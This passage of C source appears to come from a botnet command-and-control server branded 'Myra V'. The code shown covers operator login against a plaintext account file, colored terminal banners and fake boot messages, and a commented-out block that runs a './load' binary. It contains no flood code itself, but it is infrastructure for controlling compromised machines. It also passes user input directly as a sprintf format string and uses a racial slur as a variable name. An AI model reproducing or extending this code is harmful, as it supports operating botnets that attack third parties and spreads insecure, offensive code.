  //if (send(clear_myra_broadcast, test_067, strlen(test_067), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_068, strlen(test_068), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(1);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  ////
  //if (send(clear_myra_broadcast, test_069, strlen(test_069), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_070, strlen(test_070), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_071, strlen(test_071), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_072, strlen(test_072), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_073, strlen(test_073), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_074, strlen(test_074), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_075, strlen(test_075), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_076, strlen(test_076), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_077, strlen(test_077), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_078, strlen(test_078), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_079, strlen(test_079), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_080, strlen(test_080), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_081, strlen(test_081), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_082, strlen(test_082), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_083, strlen(test_083), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_084, strlen(test_084), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_085, strlen(test_085), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(1);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  ////
  //if (send(clear_myra_broadcast, test_086, strlen(test_086), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_087, strlen(test_087), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_088, strlen(test_088), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_089, strlen(test_089), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_090, strlen(test_090), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_091, strlen(test_091), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_092, strlen(test_092), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_093, strlen(test_093), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_094, strlen(test_094), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_095, strlen(test_095), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_096, strlen(test_096), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_097, strlen(test_097), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_098, strlen(test_098), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_099, strlen(test_099), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_100, strlen(test_100), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_101, strlen(test_101), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_102, strlen(test_102), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(1);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  ////
  //if (send(clear_myra_broadcast, test_103, strlen(test_103), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_104, strlen(test_104), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_105, strlen(test_105), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_106, strlen(test_106), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_107, strlen(test_107), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_108, strlen(test_108), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_109, strlen(test_109), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_110, strlen(test_110), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_111, strlen(test_111), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_112, strlen(test_112), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_113, strlen(test_113), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_114, strlen(test_114), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_115, strlen(test_115), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_116, strlen(test_116), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_117, strlen(test_117), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_118, strlen(test_118), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_119, strlen(test_119), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(2);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  //{
  //FILE *fp;
  //char *ip[5000];
  //char path[5000];
  ///* Open the command for reading. */
  //sprintf(ip, "timeout 5 ./load");
  //fp = popen(ip, "r");
  //if (fp == NULL) {
  //printf("Failed to run command\n");
  //exit(1);
  //}
  ///* Read the output a line at a time - output it. */
  //while (fgets(path, sizeof(path), fp) != NULL) {
  //char puta [5000];
  //sprintf(puta, "\r \e[38;5;225m%s", path);
  //if(send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1) return;
  //}
  ///* close */
  //pclose(fp);
  //char extra [120];
  //sprintf(myra, "\r \e[38;5;134mRunning sockets should be displayed!\r\n");
  //sprintf(extra, " \e[38;5;134mNote - Myra-Network is \e[38;5;168mNOT \e[38;5;134ma attack.\r\n");
  //if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) return;
  //if(send(clear_myra_broadcast, extra, strlen(extra), MSG_NOSIGNAL) == -1) return;
  //}
  //hehe{
  //hehe    char spaces[80];
  //hehe    char equals[80];
  //hehe
  //hehe    /* Assume an 80-column screen */
  //hehe    /* The 'progress: |' is 11 characters */
  //hehe    /* There should be space for '| 100%' after it */
  //hehe    /* So that's 17 characters overhead. */
  //hehe    /* We'll use 60 characters for the bar (not using 3) */
  //hehe
  //hehe    for (int i = 0; i <= 100; i++)
  //hehe    {
  //hehe        /* Length of bar = (i * 60) / 100 */
  //hehe        int barlen = (i * 60) / 100;
  //hehe        int spclen = 60 - barlen;
  //hehe        char poop [500];
  //hehe        memset(equals, '=', barlen);
  //hehe        equals[barlen] = '\0';
  //hehe        memset(spaces, ' ', spclen);
  //hehe        spaces[spclen] = '\0';
  //hehe        sprintf(poop, "\rprogress: |%s%s| %3d%%", equals, spaces, i);
  //hehe        usleep(20000);
  //hehe        if (send(clear_myra_broadcast, poop, strlen(poop), MSG_NOSIGNAL) == -1) goto finish_integer;
  //hehe    }
  //hehe    usleep(20000);
  //hehe    putchar('\n');
  //hehe}
  for (int loop = 0; loop < 2; ++loop)
  {
    for (int each = 0; each < 4; ++each)
    {
      char loadinganimation[500];
      sprintf(loadinganimation, "\r\e[38;5;134mBooting \e[38;5;225mMyra \e[38;5;168mV\e[38;5;134m%.*s   \b\b\b", each, "...");
      fflush(stdout); //force printing as no newline in output
      if (send(clear_myra_broadcast, loadinganimation, strlen(loadinganimation), MSG_NOSIGNAL) == -1)
        goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      sleep(1);
    }
  }
  FILE *fp;                           // Check
  int trim_integer = 0;               // Create Integer For I
  int c;                              // Create Integer For C
  fp = fopen("myra-db-set.txt", "r"); // format: username pass identification_type (identification_type is only need if Admin username ex: username pass Admin)
  while (!feof(fp))                   // feof
  {
    c = fgetc(fp);  // Define C to fget
    ++trim_integer; // Total Value Size
  }
  int succ = 0;                    // Create Integer J
  rewind(fp);                      // Rewind [fp]
  while (succ != trim_integer - 1) // Call Integer J
  {
    fscanf(fp, "%s %s %s", accounts[succ].username, accounts[succ].password, accounts[succ].identification_type); // Displaying, User -- Pass -- Plan, Through Specific Format
    ++succ;
  }

  char Prompt_01[500];
  char Prompt_02[500];
  char Prompt_03[500];
  char Prompt_04[500];
  char Prompt_05[500];
  char Prompt_06[500];
  char Prompt_07[500];
  char Prompt_08[500];
  char Prompt_09[500];
  char Prompt_10[500];
  char Prompt_11[500];
  char Prompt_12[500];
  char Prompt_13[500];
  char Prompt_14[500];
  sprintf(Prompt_01, "\e[38;5;225m╔══════════════════════════════╗\r\n");
  sprintf(Prompt_02, "\e[38;5;225m║ \e[38;5;168mMyra \e[38;5;134mV\e[38;5;168m, Build \e[38;5;134m42\e[38;5;168m.            \e[38;5;225m║\r\n");
  sprintf(Prompt_03, "\e[38;5;225m║ \e[38;5;168mProject\e[38;5;225m: \e[38;5;168mMyra \e[38;5;225mV \e[38;5;134mC2 \e[38;5;168mx \e[38;5;134mReborn\e[38;5;168m. \e[38;5;225m║\r\n");
  sprintf(Prompt_04, "\e[38;5;225m║ \e[38;5;168mVersion\e[38;5;225m: \e[38;5;168mMark \e[38;5;225mV\e[38;5;168m. [\e[38;5;134m碎\e[38;5;168m]        \e[38;5;225m║\r\n");
  sprintf(Prompt_05, "\e[38;5;225m║ \e[38;5;168mOS_Option(\e[38;5;225ms\e[38;5;168m)\e[38;5;225m: \e[38;5;168mCentOS \e[38;5;225m- \e[38;5;134m7     \e[38;5;225m║\r\n");
  sprintf(Prompt_06, "\e[38;5;225m╚════════╦═════════════════════╝\r\n");
  sprintf(Prompt_07, "\e[38;5;225m         ╠══════════════════════════════════╗\r\n");
  sprintf(Prompt_08, "\e[38;5;225m         ║ \e[38;5;168mDeveloper\e[38;5;225m: \e[38;5;134mTransmissional\e[38;5;168m.       \e[38;5;225m║\r\n");
  sprintf(Prompt_09, "\e[38;5;225m     ╔═══╩══════════════════════════════════╝\r\n");
  sprintf(Prompt_10, "\e[38;5;225m     ║\r\n");
  sprintf(Prompt_11, "\e[38;5;225m╔════╩════════════════════╗\r\n");
  sprintf(Prompt_12, "\e[38;5;225m║ \e[38;5;168mPlease Login Below\e[38;5;134m.     \e[38;5;225m║\r\n");
  sprintf(Prompt_13, "\e[38;5;225m╚═════════════════════════╝\r\n");
  sprintf(Prompt_14, " \r\n");
  if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
    goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
    goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if (send(clear_myra_broadcast, Prompt_01, strlen(Prompt_01), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_02, strlen(Prompt_02), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_03, strlen(Prompt_03), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_04, strlen(Prompt_04), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_05, strlen(Prompt_05), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_06, strlen(Prompt_06), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_07, strlen(Prompt_07), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_08, strlen(Prompt_08), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_09, strlen(Prompt_09), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_10, strlen(Prompt_10), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_11, strlen(Prompt_11), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_12, strlen(Prompt_12), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_13, strlen(Prompt_13), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, Prompt_14, strlen(Prompt_14), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  sprintf(myra, "\e[38;5;225mUsername:\e[38;5;168m "); // Username Input
  if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
    goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
  if (buffer_size_string_compare(myra_buffer_size, sizeof myra_buffer_size, clear_myra_broadcast) < 1)
    goto finish_integer;                           // Restate Buffer Size, If Output Is Released
  trim_removev2(myra_buffer_size);                 // Trim [Buffer]
  sprintf(usernamez, myra_buffer_size);            // Use Data From 'Usernamez'
  write_string = ("%s", myra_buffer_size);         // Find String Input From User
  find_line = myra_file_searcher_v3(write_string); // We Search The User File
  char founduser[500];
  char passwordprompt[500];
  //char showme [500];
  if (strcmp(write_string, accounts[find_line].username) == 0)
  {                                                                                                                           // Here Is Our Login System
    sprintf(founduser, "\e[38;5;168mLogging In As User: \e[38;5;134m%s\r\n", accounts[find_line].username, myra_buffer_size); // Find User, Via The Login File, This Is Dependent On User Input
    sprintf(passwordprompt, "\e[38;5;168mPlease Enter Your Password!\r\n");                                                   // Enter Password Display Output - This Is User Input
    sprintf(myra, "\e[38;5;225mPassword: \e[?25l\e[38;5;0m");                                                                 // Enter Password - This Is User Input
    //sprintf(showme, "\e[?25h");
    if (send(clear_myra_broadcast, founduser, strlen(founduser), MSG_NOSIGNAL) == -1)
      goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    if (send(clear_myra_broadcast, passwordprompt, strlen(passwordprompt), MSG_NOSIGNAL) == -1)
      goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
      goto finish_integer; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
                           //if (send(clear_myra_broadcast, showme, strlen(showme), MSG_NOSIGNAL) == -1) goto finish_integer;
    if (buffer_size_string_compare(myra_buffer_size, sizeof myra_buffer_size, clear_myra_broadcast) < 1)
      goto finish_integer;           // Restate Buffer Size, If Output Is Released
    trim_removev2(myra_buffer_size); // Trim [Buffer]
    if (strcmp(myra_buffer_size, accounts[find_line].password) != 0)
      goto failed;                     // If No User, Is Found, Continue To 'Failed' Output
    memset(myra_buffer_size, 0, 3000); // Memset Data Block Fill, Just So We Are Stable
    goto Myra;                         // Go To 'Myra'
  }
failed:
  pthread_create(&title, NULL, &myra_title_creator, sock);
  char failed_line1[5000]; // Char Every Line For Output Communication
  char failed_line2[5000]; // Char Every Line For Output Communication

  char clearscreen[5000];                   // Char Every Line For Output Communication
  memset(clearscreen, 0, 3000);             // Memset Data Block Fill, Just So We Are Stable
  sprintf(clearscreen, "\033[2J\033[1;1H"); // Clear Screen

  sprintf(failed_line1, "Login Error!\r\n");                                         // We are Attempting To Display FailedBanner!
  sprintf(failed_line2, "If you run into this issue please contact the owner!\r\n"); // We are Attempting To Display FailedBanner!

  sleep(1); // You Have Failed!
  if (send(clear_myra_broadcast, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1)
    goto finish_integer; // You Have Failed!
  if (send(clear_myra_broadcast, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1)
    goto finish_integer; // You Have Failed!
  if (send(clear_myra_broadcast, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1)
    goto finish_integer; // You Have Failed!
  sleep(3);              // Sleep For 3 Seconds, Clean Exit
  goto finish_integer;   // You Have Failed!
  if (send(clear_myra_broadcast, "\033[1A", 5, MSG_NOSIGNAL) == -1)
    goto finish_integer;
Myra:                                                      // We are Displaying Attempting to display main banner!
  pthread_create(&title, NULL, &myra_title_creator, sock); // We are Displaying Attempting to display main banner!
  if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
    goto finish_integer; // We are Displaying Attempting to display main banner!
  //if(send(clear_myra_broadcast, "\r\n", 2, MSG_NOSIGNAL) == -1) goto finish_integer; // We are Displaying Attempting to display main banner!
  char placehold_01[500];
  char placehold_02[500];
  char placehold_03[500];
  char placehold_04[500];
  char placehold_05[500];
  char placehold_06[500];
  char placehold_07[500];
  char placehold_08[500];
  char placehold_09[500];
  char placehold_10[500];
  char placehold_11[500];
  char placehold_12[500];
  char placehold_13[500];
  char placehold_14[500];
  char placehold_15[500];
  char placehold_16[500];
  char placehold_17[500];
  char placehold_18[500];
  char placehold_19[500];
  char placehold_20[500];
  char placehold_21[500];
  char placehold_22[500];
  char placehold_23[500];
  /////////////////////////////////
  int max_spaces_number = 17;
  int number_of_spaces = max_spaces_number - strnlen(accounts[find_line].username, sizeof(accounts[find_line].username));
  ///////////////////////////////////////////////////////////////////////////////////////
  //int nigga;
  //char words [1000];
  //sprintf(words,    "                             \e[38;5;134mWelcome To \e[38;5;225mMyra \e[38;5;168mV\e[38;5;134m.");
  //char out [3000];
  //for(nigga = 0; nigga < strlen(words); nigga++) {
  //    usleep(45000);
  //    sprintf(out, "%c", words[nigga]);
  //    fflush(stdout);
  //    if(send(clear_myra_broadcast, out, strlen(out), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  //sleep(500);
  sprintf(placehold_01, "                        \r\n");
  sprintf(placehold_02, "                        \r\n");
  sprintf(placehold_03, "                        \r\n");
  sprintf(placehold_04, "                        \r\n");
  sprintf(placehold_05, "                        \r\n");
  sprintf(placehold_06, "                        \r\n");
  sprintf(placehold_07, "                        \r\n");
  sprintf(placehold_08, "                        \r\n");
  sprintf(placehold_09, "                        \r\n");
  sprintf(placehold_10, "                        \r\n");
  //sprintf(placehold_14, "                        \r\n");
  //sprintf(placehold_15, "                        \r\n");
  //sprintf(placehold_16, "                        \r\n");
  //sprintf(placehold_17, "                        \r\n");
  //sprintf(placehold_18, "                        \r\n");
  //sprintf(placehold_19, "                        \r\n");
  //sprintf(placehold_20, "                        \r\n");
  //sprintf(placehold_21, "                        \r\n");
  //sprintf(placehold_22, "                        \r\n");
  //sprintf(placehold_23, "                        \r\n");
  if (send(clear_myra_broadcast, placehold_01, strlen(placehold_01), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_02, strlen(placehold_02), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_03, strlen(placehold_03), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_04, strlen(placehold_04), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_05, strlen(placehold_05), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_06, strlen(placehold_06), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_07, strlen(placehold_07), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_08, strlen(placehold_08), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_09, strlen(placehold_09), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, placehold_10, strlen(placehold_10), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  int nigga;
  //char words [200];
  char words[101] = "                               \e[38;5;134mWelcome To \e[38;5;225mMyra \e[38;5;168mV\e[38;5;134m.\r\n";
  char out[101];
  for (nigga = 0; nigga < strlen(words); nigga++)
  {
    usleep(30000);
    sprintf(out, "%c", words[nigga]);
    if (send(clear_myra_broadcast, out, strlen(out), MSG_NOSIGNAL) == -1)
      goto finish_integer;
    fflush(stdout);
  }
  int nigga2;
  //char words2 [200];
  char words2[97] = "                                  [\e[38;5;168mBuild \e[38;5;225m43\e[38;5;168m.\e[38;5;134m]\r\n";
  char out2[97];
  for (nigga2 = 0; nigga2 < strlen(words2); nigga2++)
  {
    usleep(24000);
    sprintf(out2, "%c", words2[nigga2]);
    if (send(clear_myra_broadcast, out2, strlen(out2), MSG_NOSIGNAL) == -1)
      goto finish_integer;
    fflush(stdout);
  }
  int i = 0;
  char hehex[5000];
  for (i = 0; i < 10000; i++)
  {
    sprintf(hehex, "\r                                     \e[38;5;134m[\e[38;5;225m%d\e[38;5;168m%\e[38;5;134m]", i / 100);
    if (send(clear_myra_broadcast, hehex, strlen(hehex), MSG_NOSIGNAL) == -1)
      goto finish_integer;
    fflush(stdout);
  }
  //if(send(clear_myra_broadcast, placehold_14, strlen(placehold_14), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_15, strlen(placehold_15), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_16, strlen(placehold_16), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_17, strlen(placehold_17), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_18, strlen(placehold_18), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_19, strlen(placehold_19), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_20, strlen(placehold_20), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_21, strlen(placehold_21), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_22, strlen(placehold_22), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if(send(clear_myra_broadcast, placehold_23, strlen(placehold_23), MSG_NOSIGNAL) == -1) goto finish_integer;
  sleep(3);
  ///////////////////////////////////////////////////////////////////////////////////////
  if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
    goto finish_integer;
  //int i = 0;
  //char substrate_boot [5000];
  //for (i = 0; i < 100000; i++){
  //    sprintf(substrate_boot, "\r\e[38;5;134mBooting \e[38;5;225mSubstrate \e[38;5;168mVI \e[38;5;134m- [\e[38;5;168m%d%\e[38;5;134m]", i/1000);
  //    fflush(stdout);
  //    if(send(clear_myra_broadcast, substrate_boot, strlen(substrate_boot), MSG_NOSIGNAL) == -1) goto finish_integer;
  //}
  char new_line[500];
  char verbose_boot_01[500];
  char verbose_boot_02[500];
  char verbose_boot_03[500];
  char verbose_boot_04[500];
  char verbose_boot_05[500];
  char verbose_boot_06[500];
  char verbose_boot_07[500];
  char verbose_boot_08[500];
  char verbose_boot_09[500];
  char verbose_boot_10[500];
  char verbose_boot_11[500];
  char verbose_boot_12[500];
  char verbose_boot_13[500];
  char verbose_boot_14[500];
  char verbose_boot_15[500];
  char verbose_boot_16[500];
  char verbose_boot_17[500];
  char verbose_boot_18[500];
  char verbose_boot_19[500];
  char verbose_boot_20[500];
  sprintf(new_line, "\r\n");
  sprintf(verbose_boot_01, "\e[38;5;134mLocalising memory_reg..\r\n");
  sprintf(verbose_boot_02, "\e[38;5;134mEnumerating new encryption set using mach_swap..\r\n");
  sprintf(verbose_boot_03, "\e[38;5;134m0xfffff8000d3 : 0xffff938d9\r\n");
  sprintf(verbose_boot_04, "\e[38;5;134m0xfffff8000a4 : 0xffff939d2\r\n");
  sprintf(verbose_boot_05, "\e[38;5;134m0xfffff8002sa : 0xffff2ekd7\r\n");
  sprintf(verbose_boot_06, "\e[38;5;134m0xfffff80dc9e : 0xfff8dopx5\r\n");
  sprintf(verbose_boot_07, "\e[38;5;134m0xfffd89xc3ls : 0xfffkod9d3\r\n");
  sprintf(verbose_boot_08, "\e[38;5;134m0xffffnd839fe : 0xffff5ufn1\r\n");
  sprintf(verbose_boot_09, "\e[38;5;134m0xffffd30e00d : 0xff00djss0\r\n");
  sprintf(verbose_boot_10, "\e[38;5;134m0xffffox0321q : 0xff00dkxsz\r\n");
  sprintf(verbose_boot_11, "\e[38;5;134mSocket_exchange has been masked successfully !\r\n");
  sprintf(verbose_boot_12, "\e[38;5;134mUsing alphanumeric subset system..\r\n");
  sprintf(verbose_boot_13, "\e[38;5;134mSubstrate is resetting opposing socket..\r\n");
  sprintf(verbose_boot_14, "\e[38;5;134mSubstrate has successfully reset.\r\n");
  sprintf(verbose_boot_15, "\e[38;5;134mPackaging existing binaries with Myra..\r\n");
  sprintf(verbose_boot_16, "\e[38;5;134mRunning deferred execution scheduler..\r\n");
  sprintf(verbose_boot_17, "\e[38;5;134mApplying modified operators using mdas..\r\n");
  sprintf(verbose_boot_18, "\e[38;5;134mRunning systematic metadata checks..\r\n");
  sprintf(verbose_boot_19, "\e[38;5;134mInitiating [Hyperpower IV].. \r\n");
  sprintf(verbose_boot_20, "\e[38;5;134mAutomatically accepting system engagement !\r\n");
  if (send(clear_myra_broadcast, new_line, strlen(new_line), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  if (send(clear_myra_broadcast, verbose_boot_01, strlen(verbose_boot_01), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_02, strlen(verbose_boot_02), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_03, strlen(verbose_boot_03), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_04, strlen(verbose_boot_04), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_05, strlen(verbose_boot_05), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_06, strlen(verbose_boot_06), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_07, strlen(verbose_boot_07), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_08, strlen(verbose_boot_08), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_09, strlen(verbose_boot_09), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_10, strlen(verbose_boot_10), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_11, strlen(verbose_boot_11), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_12, strlen(verbose_boot_12), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_13, strlen(verbose_boot_13), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_14, strlen(verbose_boot_14), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_15, strlen(verbose_boot_15), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_16, strlen(verbose_boot_16), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_17, strlen(verbose_boot_17), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_18, strlen(verbose_boot_18), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_19, strlen(verbose_boot_19), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  usleep(100000);
  if (send(clear_myra_broadcast, verbose_boot_20, strlen(verbose_boot_20), MSG_NOSIGNAL) == -1)
    goto finish_integer;
  //char substrate_boot2 [5000];
  //for (i = 0; i < 100000; i++){
  //    sprintf(substrate_boot2, "\r\e[38;5;134mChecking Dependencies..\e[38;5;134m [\e[38;5;168m%d%\e[38;5;134m]", i/1000);
  //    fflush(stdout);
